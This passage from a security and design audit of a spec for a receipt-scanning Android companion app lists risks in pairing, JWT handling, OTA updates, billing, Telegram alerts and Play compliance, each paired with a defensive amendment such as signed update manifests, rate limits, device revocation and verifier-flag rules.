- Add a pending record: `scan:pending:<userId>:<scanId>` before `spend()`, with `{ receiptHash, startedAt }`. A reconciliation job or an admin endpoint can refund stale pending scans that have no result after N minutes. If a job is out of scope, document the at-most-once risk and add an admin "refund stuck scan" action.
- Refund should restore the original lot or a lot with the original expiry, not always a fresh 30-day lot. If that is too complex, document the extension and cap it.
- On append failure, refund only when the failure is definitive. If the error is a network timeout after the write may have succeeded, do not refund immediately; mark pending and reconcile.

#### H11. `/api/extract` is an unauthenticated, uncapped AI cost sink

**Evidence**

- `src/app/api/extract/route.ts` has no auth, no rate limit, no image size limit, and no content-type allowlist.
- `runExtraction(image)` calls PP-OCRv6, DeepSeek, and possibly Gemini, all of which cost money.
- A mobile token makes it easy to automate extraction without ever appending or spending a credit.

**Impact**

An attacker with one valid mobile token, or no token at all today, can burn AI COGS. This is a direct financial risk and an abuse path that the credit ledger does not cover because credits are only spent on append.

**Required amendment**

- Require a valid mobile token or web session for `/api/extract` in production, or keep it public only behind a strict IP rate limit.
- Add:
  - Max image size (for example 12 MB) and max dimensions; reject oversized or non-image content.
  - Content-type allowlist: `image/jpeg`, `image/png`, `image/webp`; mobile sends JPEG only.
  - Per-user rate limit (for example 60 per hour) and per-IP limit, independent of credits.
  - A daily extraction cap per user to bound COGS.
  - Structured logs with `runId`, `userId` hash, and `finish`, never the image or token.
- Keep the pipeline signature `runExtraction(image: File)` and do not pass `userId`, email, sheet id, or Authorization into it.

#### H12. OTA integrity: no checksum, no signature, mutable `latest` URL, no install verification

**Evidence**

- §5.1 returns `download_url` only. There is no `sha256`, `size`, or signature.
- The example URL is `https://github.com/zippp-app/zippp/releases/latest/download/zippp-v1.0.1.apk`. `latest` is mutable; a compromised release can replace the asset.
- The client opens `Intent.ACTION_VIEW` in the system browser. The app cannot verify what the browser downloads or installs.
- `/api/app-version` is public and has no cache/rate-limit policy.

**Impact**

A compromised endpoint, GitHub organization, or DNS/TLS path can direct users to a malicious APK. The app has no way to detect it. A "mandatory" update controlled by the same endpoint can be used to force a malicious install.

**Required amendment**

- Return a signed manifest:

```json
{
  "channel": "sideload",
  "latest": {
    "version_code": 2,
    "version_name": "1.0.1",
    "download_url": "https://zippp.link/downloads/zippp-v1.0.1.apk",
    "sha256": "hex",
    "size": 12345678,
    "min_supported_version_code": 1,
    "published_at": "2026-10-21T00:00:00Z",
    "release_notes": "Plain text, max 500 chars"
  },
  "signature": "ed25519:base64"
}
```

- Embed an Ed25519 public key in the app. Verify the signature over the canonical JSON before showing the dialog.
- Download in-app with OkHttp, verify SHA-256 and size, verify the APK signer certificate matches the expected SHA-256, then install via `PackageInstaller` or a `FileProvider` intent. Do not send the user to a browser for a mandatory update.
- Use a version-specific URL, not `latest`. Validate that `download_url` is HTTPS and its host is allowlisted (`zippp.link`, `github.com`, `objects.githubusercontent.com`), or host the APK on zippp.link.
- `mandatory` should be computed from `min_supported_version_code`, not trusted as a standalone boolean. If mandatory, make the dialog non-cancelable and block the back button; provide retry and a support path. If the check fails offline, do not permanently lock the user out; retry.
- Throttle the check to once per 6 hours with jitter; do not block camera startup on the network call.
- Keep `versionCode` in `build.gradle.kts` and the server env in sync from one source (git tag or CI). Add a release check that fails if they differ.

### 2.2 Medium risks

| ID | Risk | Evidence / reason | Amendment |
|---|---|---|---|
| M1 | Pairing code stored plaintext | §4.1 `SET pair:<CODE>`; a Redis dump exposes live codes | Store `SHA-256(code)`, not the code |
| M2 | JWT lacks `aud`, `iss`, `jti`, `device_id`, and algorithm allowlist | §4.1 and rollout Task 1.1 | Add claims; verify `HS256` only; use a dedicated secret >= 32 bytes; support rotation |
| M3 | JWT includes `email` and may be trusted for authorization | §4.1 `sub: google_user_id, email` | Use `sub` for authorization; load email server-side; treat the claim as display-only |
| M4 | QR custom scheme can be hijacked | `zippp://pair?code=...` in §4.1 | Use in-app scanning only, or an HTTPS App Link with `autoVerify`; validate the payload |
| M5 | `spreadsheet_id` returned to mobile without need | §4.2 login response | Remove it or justify and disclose it in Play Data Safety |
| M6 | `debug` response includes OCR tokens and raw model output | `ExtractDebug` in `src/types/receipt.ts` | Keep for the web debug panel; on mobile, do not persist or log it; consider a redacted mobile debug shape |
| M7 | All mobile copy is hardcoded in the spec | §3, §5, §6, §7 | Add keys to `spec/wording.txt` and generate `strings.xml`; do not duplicate copy |
| M8 | "6 digit" vs "6 character" vs `ZIP-842` | §4.1 and §6.1 | Define one format; use "6 karakter" or "8 karakter", not "digit" |
| M9 | `src/lib/telegram.ts` file conflicts with new `src/lib/telegram/` directory | Existing file vs §8 layout | Move the existing file to `src/lib/telegram/admin.ts` and add `index.ts` re-export, or name the new module `telegram-bot/` |
| M10 | WA deprecation would remove the business WhatsApp contact | `src/lib/business.ts`, `LegalPage`, `SiteFooter`, `CONTACT_WA` | Remove only `app.wa.*` / `src/lib/wa/*` channel code; keep `CONTACT_WA` as a business contact |
| M11 | No CI, so the "run tests/build" gates are manual | No `.github/` workflows | Add web and Android CI jobs; run `npm test`, `tsc --noEmit`, `next build`, `./gradlew lint test assembleDebug` |
| M12 | APK size target < 15 MB may fail | Compose + CameraX + bundled ML Kit | Measure early; use R8, per-ABI splits, or Play App Bundle; do not make 15 MB a release gate without a measurement |
| M13 | `sendTelegram` does not escape dynamic HTML | `src/lib/telegram.ts` interpolates text with `parse_mode: "HTML"` | Escape dynamic values or use plain text for user-generated content |
| M14 | Telegram webhook lacks `update_id` dedupe | §7.3 | Add `SET NX tg:update:<id>` with TTL |
| M15 | No `Cache-Control` / rate limit on `/api/app-version` | §5.1 | Add `Cache-Control: public, max-age=300` and an IP limit |
| M16 | Release notes are untrusted and may contain markup | §5.1 | Treat as plain text, cap length, strip control characters |
| M17 | `billingConfigured()` false state is undefined for mobile | `src/lib/billing/redis.ts`; login returns `credits` | Return `billing_configured: false`; do not block scans in unconfigured mode; show a neutral "quota unavailable" state |
| M18 | No observability for mobile pairing/append/Telegram | Existing logs are `extract.run` and `store.*` | Add structured events: `mobile.pair`, `mobile.login`, `mobile.append`, `mobile.revoke`, `telegram.link`, `telegram.failed`, `ota.check`; hash user ids |
| M19 | No offline queue defined for Android | Web has IndexedDB; mobile spec has no queue | Define a durable encrypted queue or explicitly state "no offline queue in v1" and show a retry state |
| M20 | EXIF/GPS may be uploaded with the receipt | Mobile spec says compress JPEG only | Re-encode and strip EXIF before upload; never request location permission |
| M21 | `unit_price` can be invented by the client | `src/components/app/draft.ts` derives it from amount/qty | Mobile must leave `unit_price` empty unless read or explicitly typed; do not copy the derivation |
| M22 | No `POST /api/mobile/me` for refresh/credit state | Mobile header needs balance after append | Return `credits_remaining` from append and add a lightweight mobile me/workspace endpoint |
| M23 | Web logout does not revoke mobile devices | `src/app/api/auth/logout/route.ts` | Add "revoke all mobile devices" or state clearly that web logout does not revoke mobile |
| M24 | Pairing code generation uses no CSPrng requirement | §4.1 | Use `crypto.randomBytes`/`randomInt`; add a unit test that two thousand codes are unique |
| M25 | Error envelope is not typed | Server currently returns `error` strings | Add `{ ok, code, message?, request_id }`; Android maps codes, not strings |
| M26 | No API versioning | `/api/extract` and `/api/sheets/append` are unversioned | Add `/api/mobile/v1/*` or an `X-Zippp-Api-Version` header and a minimum supported version |
| M27 | No `min_supported_version_code` in app-version | §5.1 has only `mandatory` | Add it; compute mandatory server-side |
| M28 | Pairing code TTL is not reflected in the mobile UI | §4.1 has no countdown on the app side | Show "Kode berlaku 10 menit" and a retry state |
| M29 | No `update_id`/nonce for Telegram start token replay | §7.3 | Token is one-time; dedupe updates and log link attempts |
| M30 | No admin/support path for a stuck scan | No reconciliation | Add an admin refund endpoint or a documented support procedure |

### 2.3 Low risks

| ID | Risk | Amendment |
|---|---|---|
| L1 | "Saldo" and "kredit" imply money; "kuota scan" is safer for Play | Use "kuota scan" in Android resources |
| L2 | "Masukkan kode 6 digit dari dashboard web" mentions the web portal | Say "Masukkan kode pairing dari akun zippp" |
| L3 | The spec uses emoji in Telegram copy | Allowed, but keep copy in `wording.txt` and avoid user-data interpolation |
| L4 | `TELEGRAM_BOT_USERNAME` is not validated before building `t.me` links | Validate `^[A-Za-z0-9_]{5,32}$` |
| L5 | `support_<userId>` leaks the Google user id in a Telegram deep link | Use an opaque support session id mapped server-side |
| L6 | The QR code can be captured from the web screen | Keep the 10-minute TTL and one-time use; consider a "hide code" control |
| L7 | No app-version endpoint `ETag` | Add `ETag` and `Cache-Control` |
| L8 | `content-type` and image dimensions are not limited on extract | Add server-side checks |
| L9 | The app's `release_notes` could contain a URL that opens externally | Treat as plain text; do not auto-link |
| L10 | The plan does not state whether the Play build uses an AAB or APK | Use an AAB for Play, an APK for sideload |
| L11 | The plan's "zero WhatsApp dependencies" exit gate is too broad | Keep `CONTACT_WA`; remove only the channel code and `app.wa.*` copy |
| L12 | No `android/local.properties` handling | Add to `.gitignore`; document `sdk.dir` and `JAVA_HOME` |
| L13 | Keystore handling is unspecified | Use CI secrets; never commit `*.jks`/`*.keystore`; back up the key |
| L14 | No mention of Play App Signing vs sideload key | Decide before release; users cannot migrate between differently signed builds without uninstall |
| L15 | `versionName` semver vs `versionCode` integer is not defined | Use a monotonic integer from CI and a semver name |
| L16 | No structured log for pairing failures | Add `event`, `ipHash`, `outcome`, no code/token |
| L17 | No test for "0 credits does not show purchase copy" | Add an instrumentation test or a resource grep |
| L18 | No test for device revocation | Add an integration test: pair, revoke, assert 401 |
| L19 | No test for formula escaping | Add unit tests in `templates`/`sheet-safe` |
| L20 | No test for data-boundary regression with mobile imports | Extend `data-boundary.test.ts` |

---

## 3. Architecture and contract edge cases

### 3.1 Authentication and session flow

| Case | Current spec | Required behavior |
|---|---|---|
| User has no workspace | Login response still includes `spreadsheet_id`/`template_id`; undefined if null | Return `workspace.ready: false` and `reason: "NO_WORKSPACE"`; app shows "Selesaikan pengaturan di zippp" and disables camera/Terima. No purchase link. |
| User has 0 credits | §3 handles it in the app; server 402 text leaks | Pairing succeeds; header shows `0 scan`; Terima disabled; 402 maps to neutral copy; refresh button. |
| Billing not configured | Undefined | `billing_configured: false`; do not block; show "Kuota tidak tersedia" or allow unconfigured mode consistent with web. |
| Google refresh token revoked | Append returns 401 `needsReconsent` | Mobile maps to `GOOGLE_RECONSENT`: "Buka zippp di web untuk masuk ulang." Clear no local token; keep pairing. |
| Device revoked | No state | `401 DEVICE_REVOKED`; clear local token; return to pairing; show "Perangkat ini sudah diputuskan." |
| Pairing code expired/used | Generic inline error | Same generic error; no distinction; allow "Coba lagi" and generate a new code on web. |
| Web session expires while pairing modal open | Not defined | Modal should show "Sesi web berakhir. Masuk lagi."; no token is issued. |
| User logs out on web | Mobile token remains valid | Decide: revoke all devices on web logout, or state that web logout does not sign out mobile. Prefer revoke-all or a separate "Keluar dari semua perangkat". |

### 3.2 Capture and review FSM

The current diagram is too coarse. Add explicit states:

```text
Idle
 -> Pairing
 -> PairingPending (optional device approval)
 -> Camera
 -> Capturing
 -> Uploading
 -> Review
 -> Editing
 -> Appending
 -> Appended
 -> Camera

Failure states:
Uploading -> Failed (retryable) | NoCredits | SessionExpired | NoWorkspace
Appending -> AppendFailed (retryable, scanId stable) | NoCredits | SessionExpired | AlreadyAppended
```

Rules:

- `Buang` deletes the local image/draft and any server-side pending scan record; it never spends a credit.
- `Ubah` changes a draft only. It never mutates the machine-read receipt used for telemetry.
- `Terima` is disabled while `Appending`; it uses one stable `scanId`.
- On `402`, do not show purchase copy. On `409`, check for a stored result and treat it as success if the row exists.
- On app kill during `Appending`, on restart call `GET /api/mobile/scans/<scanId>` before retrying.
- If there is no offline queue, show a clear "Koneksi gagal. Coba lagi." state and keep the image in memory only for the session. If there is an offline queue, encrypt it, cap it, and define retention.

### 3.3 Verifier flags and `Ubah`

The verifier returns:

- `receipt.flags[]` with `path`, `reason`, `detail`, `row`
- `nulled[]`
- `severity`
- `retry`

The current web `ConfirmCard` only checks "no lines" and "no price"; it does not render flags. The mobile spec mentions a warning pill for merchant only. That is not enough.

Recommended semantics:

| Flag class | Reasons | UI | Accept behavior |
|---|---|---|---|
| Hard | `missing`, `not_in_ocr`, `ungrounded`, `arithmetic` | Red badge on the field and a summary row | Block Terima until the user edits the field or taps an explicit "Saya sudah periksa" acknowledgement for that field |
| Soft | `low_confidence`, `row_mismatch` | Amber badge | Allow Terima, but show the badge |
| User edit | Any field the user changed | "Diedit" badge | The edited value is user-attested; keep the original flag in telemetry, but do not block on it |
| Assumed date | Date filled from capture time | Amber "tanggal diasumsikan" | Exclude from "wrong and unflagged" telemetry; write to sheet only if the user accepts |

Additional rules:

- Do not re-run OCR grounding on edited values. The verifier's job is to check the model, not the user. Instead, run a deterministic arithmetic/format validation on the edited receipt:
  - numbers finite and non-negative
  - `qty * unit_price` approximately equals `amount` when all three are present
  - `subtotal + tax` approximately equals `total` when present
  - line sum approximately equals `subtotal` when all amounts are present
  - date is `YYYY-MM-DD` or null
- Return warnings, not hard rejections, for arithmetic mismatches caused by edits. The user may have a discount or a missing line.
- Send correction telemetry to `/api/corrections` with bearer auth: `runId`, `scanId`, `fields[] { path, edited, flagged, reasons[] }`, no raw values. This is the same signal the web already collects.
- Do not add flag columns to the user's sheet unless a template explicitly defines them. The Sheet is the system of record; flags are telemetry.

### 3.4 Append contract

Proposed request:

```json
{
  "scanId": "server-issued-uuid",
  "receipt": {
    "merchant": "string|null",
    "date": "YYYY-MM-DD|null",
    "date_assumed": false,
    "currency": "IDR|null",
    "category": "string|null",
    "line_items": [
      { "description": "string|null", "qty": 1, "unit_price": 15000, "amount": 15000 }
    ],
    "subtotal": 15000,
    "tax": null,
    "total": 15000
  },
  "ops": {
    "staff": "string|null",
    "outlet": "string|null",
    "payment": "string|null",
    "purpose": "string|null",
    "customer": "string|null"
  },
  "photo_upload_id": "string|null"
}
```

Proposed success response:

```json
{
  "ok": true,
  "scan_id": "uuid",
  "rows_written": 3,
  "sheet_tab": "2026-10",
  "spreadsheet_title": "Pengeluaran 2026",
  "photo": "https://drive.google.com/...",
  "photo_error": null,
  "credits_remaining": 84,
  "duplicate": false
}
```

Proposed error codes:

| HTTP | Code | Mobile behavior |
|---|---|---|
| 400 | `RECEIPT_INVALID` | Show field errors; stay in Review |
| 400 | `OUTLET_REQUIRED` | Open outlet picker |
| 401 | `SESSION_EXPIRED` | Clear local token? No; re-pair or ask web sign-in |
| 401 | `GOOGLE_RECONSENT` | Show "Buka zippp di web untuk masuk ulang" |
| 401 | `DEVICE_REVOKED` | Clear token, return to pairing |
| 402 | `NO_CREDITS` | Neutral zero-quota state; no purchase copy |
| 409 | `SCAN_ALREADY_SENT` | If stored result exists, treat as success |
| 422 | `RECEIPT_INCONSISTENT` | Show warnings; allow override if policy permits |
| 429 | `RATE_LIMITED` | Show retry after; no purchase copy |
| 503 | `STORE_UNAVAILABLE` | Retry; do not spend/refund twice |

The error envelope should be consistent:

```json
{ "ok": false, "code": "NO_CREDITS", "message": null, "request_id": "..." }
```

The mobile client must never display `message` if it is written for the web. It should map `code` to a `wording.txt` key.

### 3.5 Data boundary

The current test is good but incomplete for the pivot.

`src/lib/data-boundary.test.ts` checks:

- `PHOTO_PATH` files do not reference Google user data patterns.
- `/api/extract` form fields are exactly `["image"]`.
- `append` does not import AI modules.

What it does not check:

- A mobile auth module or JWT (`sub`, `email`) imported by `/api/extract`.
- A future mobile route `/api/mobile/extract` that is not in `PHOTO_PATH`.
- Telegram imports in the photo path.
- The pipeline receiving `userId` or a request object.
- The `Authorization` header being forwarded to OCR/LLM calls.

Add tests:

1. `PHOTO_PATH` includes `src/app/api/mobile/extract/route.ts`, `src/lib/auth/mobile-token.ts`, and any mobile wrapper.
2. No file in the photo path references `google_user_id`, `googleUserId`, `email`, `sub`, `Authorization`, `Bearer`, `@/lib/telegram`, or `@/lib/google/`.
3. `runExtraction` accepts only `File` (no user context).
4. `append` still does not import AI modules, but may import `@/lib/auth/request-user` and `@/lib/telegram` only for notifications if that path is intentional.
5. A new "third-party data flow" test or allowlist documents where Google user data goes: Google APIs, Telegram (opt-in), email (grant notices). It should fail if a new provider is added silently.

The JWT itself does not violate the AI boundary as long as:
- It is verified in the route or a wrapper.
- Only the image is passed to `runExtraction`.
- The token is not included in the multipart form or in any OCR/LLM prompt.
- The JWT does not include sheet contents or tokens.

Still, prefer a JWT with `sub` only and load email server-side. Do not put `email` in the token unless the UI needs it; if it does, treat it as display-only and never use it for authorization.

### 3.6 Billing edge cases

| Case | Required behavior |
|---|---|
| Two devices append different receipts at the same time with 1 credit | `spend` is atomic; one succeeds, one gets `NO_CREDITS` |
| Same scan retried after a lost response | `scan:result` returns the original success; no double charge |
| Same scan id from a different user | Reject `SCAN_NOT_OWNED`; do not let it hit the global idempotency key |
| Append fails before write | Refund; allow retry |
| Append may have succeeded but timed out | Pending state; reconcile; do not blind-refund |
| Refund fails | Log `refund.failed`; show support; do not silently drop the credit |
| Credit lot expires during review | Append returns `NO_CREDITS`; neutral copy; no purchase link |
| Billing unconfigured | Do not enforce; report `billing_configured: false`; do not show a fake balance |
| Low credit threshold crossed | Send one Telegram alert per low period; reset after top-up |
| Top-up webhook retried | `grant` idempotent; Telegram confirmation idempotent on order id |
| Referral bonus on first top-up | Existing `onTopupApproved` runs; Telegram confirmation should be after it, not inside `grant` |

### 3.7 Telegram and WhatsApp transition edge cases

| Case | Required behavior |
|---|---|
| User has an existing WhatsApp link | Do not delete silently. Feature-flag WA off; send a migration notice; keep read-only support for a window; provide a support path |
| User sends `/start` with no token | Explain linking generically; do not reveal whether the user is linked |
| User sends `/start link_<expired>` | Same generic "Kode tidak berlaku" message; no account enumeration |
| User sends `/start link_<valid>` in a group | Reject; ask them to DM the bot |
| Telegram account already linked to another Zippp user | Reject; require web-side transfer/unlink |
| Telegram account linked, then user unlinks on web | Next `/saldo` returns "Belum terhubung"; remove both indexes |
| Telegram bot blocked by user | Outbound send fails; log, never block billing |
| Telegram API 429 | Back off; do not retry aggressively; do not block the caller |
| Bot token rotated | Old webhook secret still valid? Rotate both; support overlap |
| Webhook replayed | `update_id` dedupe; no duplicate top-up/pairing messages |
| Admin alert vs user alert | Separate chat ids; never send admin details to a user chat |
| Dynamic HTML | Escape `&`, `<`, `>`; or use plain text for user values |
| Receipt image sent to bot | Reject in v1; if added, disclose third-party image processing |

---

## 4. Direct answers to the audit questions

### 4.1 Are the app restraints sufficient to pass Play review without mandatory Play Billing?

**Answer:** The restraints are necessary but not sufficient. "No IAP, no sign-up, no purchase UI, no anti-steering" is the correct posture, and it is the best chance of passing as a companion app. But the spec overstates the "Inkdrop Model" as a guaranteed 0% listing. Google's reader app program is specific and must be declared; a receipt-scanning SaaS companion may not qualify. The app also currently plans a self-updating APK from GitHub, which is prohibited for Play-distributed apps, and `targetSdk 34` is below the Play minimum in late 2026. **The app as specified cannot be both a Play listing and a GitHub self-updater.** Pick a channel, and add a Play Console compliance phase.

**Anti-steering vulnerability:** Yes, two concrete ones. The 402 server string "No credits. Top up to send." can leak into the mobile UI, and the Telegram low-credit copy says "Buka dashboard web untuk isi ulang". Also, "kredit"/"saldo" on the review button and header may read as a virtual currency. Replace with "kuota scan", map error codes, and remove purchase language from all Android resources and Telegram alerts. Add a CI grep.

**0-credit state:** Show a neutral status, disable the shutter/Terima, provide `Muat ulang` and `Bantuan`, and never link to the web top-up page. The server returns `402 { code: "NO_CREDITS" }`; the app maps it to a neutral `wording.txt` key. Do not reuse `app.credits.none` from the web if it says "Top up".

### 4.2 Is the 6-character pairing code secure against brute force?

**Answer:** Not as written. The spec is inconsistent: `ZIP-842` is three digits (1,000 possibilities), while the text says six characters. There is no rate limiting, no attempt counter, no atomic consume, no collision-safe generation, and no device approval. Three digits with a 10-minute TTL is trivially brute-forced. Six characters from a 32-character alphabet (about 30 bits) is only acceptable with strict limits. Use **8 Crockford Base32 characters (40 bits)**, hash at rest, `SET NX` generation, `GETDEL` consumption, 5 attempts per code, 10 per IP per 10 minutes, 20 per user per hour, and generic errors. Device approval is strongly recommended.

### 4.3 Does the mobile JWT maintain `data-boundary.test.ts` isolation?

**Answer:** Only if the implementation is disciplined. The JWT does not itself send Google data to the AI providers, and `runExtraction(image)` currently takes only a `File`. But the test does not catch a mobile wrapper that imports `@/lib/auth/mobile-token` and passes `userId` or `email` into the pipeline. The current `/api/extract` route also has no auth, so the JWT is not used at all yet. The bigger issue is that `append` cannot authenticate a bearer token because `hasTokens()` and `loadWorkspace()` are cookie-only. Fix the auth resolver, keep the pipeline image-only, and extend the boundary test as described in §3.5. Also treat Telegram as a new third-party data flow and document it separately.

### 4.4 Is token revocation or device unpairing addressed?

**Answer:** No. The spec has a 30-day JWT, no `jti`, no device id, no revocation list, no web device list, and no server call on Android logout. A lost phone keeps sheet write and credit spend for 30 days. Add a device record, JWT `jti` + `device_id`, a Redis revocation check on every request, a web "Perangkat terhubung" list with "Putuskan", a mobile logout that revokes, and a "revoke all" action. Fail closed if the revocation store is unavailable.

### 4.5 Does the mobile review screen adhere to "Check Before Accept"?

**Answer:** The explicit `Terima` step satisfies the literal "no auto-send" law. It does not yet satisfy the verifier's intent, because the spec does not use `verifyReceipt`'s flags. The merchant warning pill is not enough. Define hard vs soft flags, show them per field, block Terima on hard flags until the user edits or explicitly acknowledges, keep soft flags visible, and send correction telemetry. Do not re-ground edited values against OCR; run arithmetic/format validation instead. Add a "tanggal diasumsikan" state.

### 4.6 How does `Ubah` interact with grounding flags?

**Answer:** It is undefined today. The correct model is: the machine-read receipt and its flags are immutable; the draft is the user's attestation. When the user edits a field, mark it `edited`, keep the original flag in telemetry, but stop treating the old flag as a blocker for that field. Show a "Diedit" badge. Hard flags on untouched fields still block or require acknowledgement. Send a correction record with paths, `edited`, `flagged`, and reasons, but no raw values. The server writes the edited value to the sheet and does not null it. This preserves the anti-hallucination law (the model is not trusted) while allowing the human to correct the model.

### 4.7 OTA risks and update logic

**Answer:** The current design has no integrity verification and uses a mutable `latest` URL and a browser intent. Add a signed manifest, SHA-256 and size, in-app download, APK signer verification, and `PackageInstaller`. Compute `mandatory` from `min_supported_version_code`, not a standalone boolean. Block back/dismiss only when mandatory; allow retry and do not permanently lock out on network failure. Throttle checks. Most importantly, separate Play and sideload builds: Play must not install GitHub APKs. `targetSdk` must be 35+ for Play in late 2026.

### 4.8 Does Telegram introduce breaking changes to web/billing triggers?

**Answer:** Not if `sendTelegram` is preserved and the new user alerts are additive. The existing admin alerts in `kasera.ts`, `orders.ts`, `doku.ts`, and `admin/lessons` all call `sendTelegram`. The spec's new `src/lib/telegram/bot.ts` conflicts with the existing `src/lib/telegram.ts` file; resolve that before coding. Do not put low-credit alerts inside `ledger.ts`; call them after a successful spend in the append route or a notification service. Keep Telegram failures non-blocking. The WhatsApp deprecation should not remove `CONTACT_WA` or the legal/footer contact; it should remove only the channel code and `app.wa.*` copy, after a migration window.

### 4.9 Is the Android toolchain compatible with macOS, JDK 21, and SDK 34?

**Answer:** JDK 21 is available in Android Studio 2024.3's JBR (21.0.6), and the machine has SDK 34/35/36 and build-tools 34/35/36. But there is no system Java or Gradle, so `./gradlew` will fail until `JAVA_HOME` is set or a JDK is installed. Use a committed Gradle wrapper. For Play in late 2026, do not target 34; use compileSdk/targetSdk 35 (or the current minimum) with AGP 8.7.x, Gradle 8.9, Kotlin 2.0.21, and Java 17 bytecode. Compose, CameraX, DataStore, OkHttp, and ML Kit are all compatible. The one technical error is "Encrypted DataStore": it does not exist. Use DataStore + Keystore AES-GCM or EncryptedSharedPreferences. Add backup exclusion, no cleartext, and release signing via CI secrets.

---

## 5. Concrete recommended amendments

### 5.1 Amendments to `spec/themes/02-android-telegram-pivot/SPEC-ANDROID-COMPANION.md`

#### Amend §1 (Executive Summary)

Add a "Distribution and compliance" paragraph:

```markdown
### Distribution decision

v1 is a sideload APK distributed from GitHub Releases. It is not listed on
Google Play. The `sideload` build may contain the OTA installer and
`REQUEST_INSTALL_PACKAGES`.

If a Play listing is pursued, it is a separate `play` build flavor. The Play
build MUST NOT download or install APKs, MUST NOT request
`REQUEST_INSTALL_PACKAGES`, and MUST use Play In-App Updates. The GitHub OTA
endpoint may still return a Play URL for that flavor.

The "reader/companion" posture below is a review strategy, not a legal
entitlement. Do not describe the app as "Inkdrop compliant" in user-facing or
legal copy. If Play rejects the companion model, the fallback is Play Billing
with a separate SKU or remaining sideload-only.
```

Also add:

```markdown
### Toolchain baseline

- Kotlin 2.0.x, AGP 8.7.x, Gradle 8.9, Java 17 bytecode, JDK 21 for Gradle.
- compileSdk 35, targetSdk 35, minSdk 26 (or the current Play minimum at
  submission).
- A committed Gradle wrapper. `JAVA_HOME` points at the Android Studio JBR or a
  JDK 21 install.
```

#### Amend §3 (Play compliance)

Replace the zero-credit block with:

```markdown
- **Zero-Credit State Handling:** If the scan quota reaches `0`, the app shows a
  neutral status and disables the shutter and `Terima`.
  - Copy: `Kuota scan habis. Pemindaian baru belum tersedia.`
  - Actions: `Muat ulang` and `Bantuan`.
  - No purchase button, no web link, no "isi ulang", no "beli", no "top up",
    no "hubungi admin untuk membeli".
- **No currency language:** In the Android app, call the balance `sisa scan` or
  `kuota scan`, not `kredit` or `saldo`. Do not show a price or a cost on the
  `Terima` button. If a cost must be shown, use `1 scan`, not `1 kredit`.
- **Error copy:** The app never renders server `error` strings. It maps stable
  error codes to `wording.txt` keys. The server's 402 response is
  `{ ok: false, code: "NO_CREDITS" }` with no purchase copy.
- **Support:** The support link is generic. Support may not sell credits or
  direct Android users to a purchase page.
- **String audit:** CI greps Android resources for `top ?up`, `isi saldo`,
  `beli`, `buy`, `purchase`, `langganan`, `subscribe`, `website`, and
  `zippp.link`. Only the privacy policy and support URLs are allowed.
```

#### Amend §4.1 (Pairing flow)

Replace the sequence and add the following rules:

```markdown
- Code format: 8 characters from Crockford Base32, displayed as `XXXX-XXXX`.
  Alphabet: `0123456789ABCDEFGHJKMNPQRSTVWXYZ`. Input ignores case, hyphens, and
  spaces. 40 bits of entropy.
- Generation: `crypto.randomBytes`/`crypto.randomInt`; `SET NX` loop; one active
  code per user; a new code invalidates the previous one.
- Storage: `auth:pair:<sha256(code)>` -> `{ userId, expiresAt, attempts }`,
  TTL 10 minutes. Never store the plaintext code.
- Consumption: `GETDEL` or a Lua `GET`+`DEL`. A code is single-use. Two
  concurrent claims must not both succeed.
- Limits: 5 attempts per code, 10 per IP per 10 minutes, 20 per user per hour.
  Exponential lockout. Return the same `401 INVALID_PAIRING_CODE` for invalid,
  expired, used, and locked codes.
- Device metadata: the claim includes `device_id`, `device_name`, `platform`,
  and `app_version`. Store them with the issued token.
- Device approval (recommended): the claim creates a pending request; the web
  session approves it; Android polls a status endpoint. If device approval is
  not implemented, the 8-character format and limits are mandatory.
- The exchange endpoint is `POST /api/auth/pair/claim`, not
  `POST /api/auth/login`. Do not add a POST handler to the OAuth login route.
```

Replace the JWT description:

```markdown
- Claims: `sub` (google user id), `aud: "zippp-mobile"`, `iss: "zippp.link"`,
  `scope: "mobile_scan"`, `jti`, `device_id`, `ver: 1`, `iat`, `exp`.
- Do not put `email` in the token unless the UI needs it. Authorization uses
  `sub` only; email is loaded server-side.
- Algorithm: HS256 only, secret >= 32 bytes, separate from
  `TOKEN_ENCRYPTION_KEY`. Support `MOBILE_JWT_SECRET_PREVIOUS` for rotation.
- Preferred alternative: an opaque 32-byte random token, stored as
  `SHA-256(token)` in Redis with a 30-day TTL and a device record. Because
  revocation needs a store lookup anyway, this is simpler and safer.
```

Replace the login response with:

```json
{
  "token": "opaque-or-jwt",
  "expires_at": 1792684800,
  "user": {
    "email": "user@example.com",
    "credits": 85,
    "billing_configured": true
  },
  "workspace": {
    "ready": true,
    "spreadsheet_name": "Pengeluaran 2026",
    "template_id": "resto-inventory",
    "headers": ["Date", "Supplier", "..."],
    "column_map": { "date": "Date", "merchant": "Supplier" },
    "staff_names": ["Sonny"],
    "outlets": ["Pusat", "Cabang"],
    "default_outlet": "Pusat",
    "photo_proof": false
  },
  "device": { "id": "uuid", "name": "Pixel 8" }
}
```

Add a new §4.3:

```markdown
### 4.3 Device lifecycle and revocation

- `GET /api/auth/devices` (web session): list devices with name, platform,
  app version, created_at, last_seen_at.
- `POST /api/auth/device/revoke` (web session): revoke one device.
- `POST /api/auth/device/revoke-all` (web session): revoke all.
- `POST /api/auth/logout` (mobile bearer): revoke the current device, then clear
  local storage.
- Every mobile request checks `auth:device:<deviceId>` and the token's `jti`.
  If the device is missing or revoked, return `401 DEVICE_REVOKED`. If Redis is
  unavailable, return `503`, not 200.
- On pairing, send a Telegram alert with the device name and a revocation
  instruction. Do not include the full Google user id.
```

#### Amend §5 (OTA)

Replace §5.1 and §5.2 with the signed-manifest design in H12. Add:

```markdown
- `version_code` is monotonic and comes from the same CI source as
  `build.gradle.kts`.
- `mandatory` is computed from `min_supported_version_code`; it is not a
  standalone editorial flag.
- The client verifies the manifest signature, the APK SHA-256, the APK size, and
  the APK signer certificate before install. A browser intent is not acceptable
  for a mandatory or security update.
- The Play flavor ignores `download_url` and uses Play In-App Updates. It has no
  `REQUEST_INSTALL_PACKAGES`.
- Throttle checks to once per 6 hours. A failed check never blocks the camera.
```

#### Amend §6 (Capture and verification)

Add to §6.1:

```markdown
- The Review screen shows every verifier flag, not only the merchant. Hard flags
  (`missing`, `not_in_ocr`, `ungrounded`, `arithmetic`) block `Terima` until the
  user edits the field or explicitly acknowledges it. Soft flags
  (`low_confidence`, `row_mismatch`) are amber and do not block.
- `Ubah` edits a draft. The machine-read receipt and its flags are immutable.
  Edited fields get a "Diedit" badge and are no longer blocked by the original
  flag. The original flag remains in correction telemetry.
- The app sends correction telemetry to `/api/corrections` with bearer auth:
  `runId`, `scanId`, `fields[] { path, edited, flagged, reasons[] }`. No raw
  values, no images.
